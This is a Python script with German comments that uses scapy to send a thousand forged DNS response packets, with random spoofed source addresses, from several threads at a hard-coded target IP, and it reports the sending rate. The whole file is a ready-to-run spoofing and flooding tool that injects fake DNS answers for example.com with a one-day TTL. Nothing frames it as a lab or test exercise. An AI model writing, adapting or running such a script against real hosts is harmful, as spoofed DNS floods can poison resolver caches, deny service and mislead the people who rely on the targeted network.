# -*- coding: utf-8 -*-
import random
import time
import threading
from scapy.all import *

# Ziel-IP-Adresse
target_ip = "155.1.102.4"
# Anzahl der Pakete
num_packets = 1000
# Intervall für die Berechnung der Paketrate (in Sekunden)
interval = 5
# Anzahl der Threads
num_threads = 4

# Generiere eine zufällige IP-Adresse
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Generiere eine zufällige DNS-Antwort
def random_dns_answer():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Funktion zum Senden von Paketen
def send_packets(thread_id, packet_count):
    packets_sent = 0
    start_time = time.time()
    last_time = start_time

    for _ in range(packet_count):
        # Zufällige Quell-IP
        src_ip = random_ip()
        # Zufällige DNS-Antwort-IP
        answer_ip = random_dns_answer()

        # Erstelle das DNS-Antwortpaket
        dns_response = IP(src=src_ip, dst=target_ip) / UDP(sport=53, dport=random.randint(1024, 65535)) / \
                       DNS(id=random.randint(0, 65535), qr=1, aa=1, qd=DNSQR(qname="example.com"), an=DNSRR(rrname="example.com", ttl=86400, rdata=answer_ip))

        # Sende das Paket
        send(dns_response, verbose=0)
        packets_sent += 1

        # Aktuelle Zeit messen
        current_time = time.time()

        # Überprüfen, ob das Intervall erreicht ist
        if current_time - last_time >= interval:
            # Gesamtzeit für das Intervall berechnen
            interval_time = current_time - last_time
            # Paketrate für das Intervall berechnen
            packets_per_second = packets_sent / interval_time

            # Ausgabe der Paketrate
            print(f"Thread {thread_id}: Paketrate: {packets_per_second:.2f} Pakete pro Sekunde (über {interval_time:.2f} Sekunden)")

            # Reset für das nächste Intervall
            last_time = current_time
            packets_sent = 0

# Starten der Threads
threads = []
packets_per_thread = num_packets // num_threads

for i in range(num_threads):
    thread = threading.Thread(target=send_packets, args=(i, packets_per_thread))
    threads.append(thread)
    thread.start()

# Warten, bis alle Threads beendet sind
for thread in threads:
    thread.join()

print(f"{num_packets} DNS-Antwortpakete wurden gesendet.")
